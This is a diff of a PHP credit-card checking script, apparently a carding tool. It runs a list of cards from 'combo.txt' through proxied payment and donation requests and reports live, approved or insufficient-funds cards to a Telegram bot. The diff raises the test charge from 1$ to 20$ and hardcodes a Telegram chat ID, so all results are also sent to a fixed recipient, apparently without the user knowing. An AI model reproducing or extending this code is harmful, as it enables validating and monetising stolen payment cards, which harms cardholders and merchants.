@@ -50,7 +50,6 @@ function payment($card,$ccNo,$month,$year,$cvv){
 	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
 	$response = curl_exec($ch);
 	if (curl_errno($ch)) {
-		die("cURL Error: " . curl_error($ch));
 	    return [
     		false,
     		"$card - Request Error On Payment \n"
@@ -104,7 +103,6 @@ function donate($card,$paymentId,$name,$email){
 	curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
 	$response = curl_exec($ch);
 	if (curl_errno($ch)) {
-		die("cURL Error: " . curl_error($ch));
 	    return [
     		false,
     		"$card -Proxy Error \n"
@@ -113,10 +111,10 @@ function donate($card,$paymentId,$name,$email){
 	    $data = json_decode($response,true);
 	    if(isset($data['errors'])){
 	    	if(isset($data['errors']) && strpos($data['errors'], "insufficient funds") === 0){
-		    	sendTele("$card - Insufficient Funds 1$");
+		    	sendTele("$card - Insufficient Funds 20$");
 		    	return [
 		    		true,
-		    		"$card - Insufficient Funds 1$ \n"
+		    		"$card - Insufficient Funds 20$ \n"
 		    	];
 		    }else{
 		    	$errors = $data['errors'];
@@ -127,16 +125,16 @@ function donate($card,$paymentId,$name,$email){
 		    }
 	    }elseif(isset($data['success'])){
 	    	if(strpos($data['data']['message'],"Verifying strong customer authentication. Please wait...") === 0){
-	    		sendTele("$card - CVV LIVE 1$ (Request 3D Secure)");
+	    		sendTele("$card - CVV LIVE 20$ (Request 3D Secure)");
 	    		return [
 	    		true,
-	    		"$card - CVV LIVE 1$ (Request 3D Secure) \n"
+	    		"$card - CVV LIVE 20$ (Request 3D Secure) \n"
 	    	];
 	    	}else{
-	    		sendTele("$card - Approved 1$");
+	    		sendTele("$card - Approved 20$");
 	    		return [
 	    		true,
-	    		"$card - Approved 1$ \n"
+	    		"$card - Approved 20$ \n"
 	    	];
 	    	}
 	    }
@@ -151,7 +149,6 @@ function random(){
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $response = curl_exec($ch);
     if (curl_errno($ch)) {
-    	die("cURL Error: " . curl_error($ch));
     	return [
     		false,
     		"Request Error On Random Generation \n"
@@ -179,12 +176,11 @@ function random(){
     }
 }
 function sendTele($message){
-	$chatId = $GLOBALS['chatId'];
-	$url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+	$url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=1668286923&text=" . urlencode($message);
     file_get_contents($url);
 }
 
-$file = readline("Enter CC File name: ");
+$file = "combo.txt";
 $chatId = readline("Enter Your Telgram Chat ID: ");
 $cardList = file_get_contents($file);
 if ($cardList === false) {
